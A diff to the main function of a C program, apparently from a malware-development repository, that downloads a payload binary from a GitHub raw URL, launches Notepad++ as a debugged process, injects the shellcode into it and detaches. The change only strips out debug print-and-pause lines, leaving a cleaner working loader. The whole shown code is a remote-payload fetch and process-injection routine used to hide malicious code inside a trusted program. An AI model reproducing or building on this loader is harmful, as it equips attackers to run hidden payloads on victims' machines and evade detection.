@@ -8,8 +8,6 @@ int main(void)
 	SIZE_T	sPayloadSize	= 0;
 
 	if (!GetPayloadFromUrl(L"https://raw.githubusercontent.com/4dorable/Maldev/master/payload.bin", &pPayload, &sPayloadSize)) { return -1; }
-	printf("TEST1\n");
-	getchar();
 
 	// Create Suspended Process
 	DWORD  dwProcessID	= 0;
@@ -18,16 +16,15 @@ int main(void)
 
 	if (!CreateDebugProcess(L"C:\\Program Files\\Notepad++\\notepad++.exe", &dwProcessID, &hProcess, &hThread)) { return -1; }
 	
-	printf("TEST1\n");
-	getchar();
+
 	// Write Payload in Process
 	if (!InjectShellcodeToRemoteProcess(hProcess, pPayload, sPayloadSize, hThread)) { return -1; }
 	if (!DebugActiveProcessStop(dwProcessID)) {
 		printf("[!] DebugActiveProcessStop Failed With Error: %lu\n", GetLastError());
 		return -1;
 	};
-	printf("TEST1\n");
-	getchar();
+
+
 	if (pPayload)
 		LocalFree(pPayload);
 
